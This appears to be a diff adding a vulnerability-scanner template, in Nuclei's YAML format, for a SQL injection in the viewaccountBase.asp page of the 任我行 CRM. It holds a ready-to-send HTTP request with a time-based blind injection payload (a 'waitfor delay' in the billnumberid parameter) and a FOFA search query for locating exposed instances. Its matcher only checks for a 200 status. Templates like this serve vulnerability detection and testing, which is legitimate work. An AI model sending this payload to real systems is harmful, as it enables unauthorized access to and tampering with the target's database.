@@ -1,0 +1,29 @@
+id: poc-8158667728
+info:
+  name: 任我行协同CRM普及版 viewaccountBase 存在SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/'
+  tags: sqli,unknown
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: ''
+    fofa: app="任我行软件-管家婆分销ERP"
+http:
+- raw:
+  - 'GET /common/viewaccountBase.asp?TimeCheckPoint=80685.73&billnumberid=-1%20waitfor%20delay%20%270:0:8%27--&billtype= HTTP/2
+
+    Host: {{Hostname}}
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
+
+    Accept-Encoding: gzip, deflate, br
+
+    Accept: */*
+
+    Connection: keep-alive'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
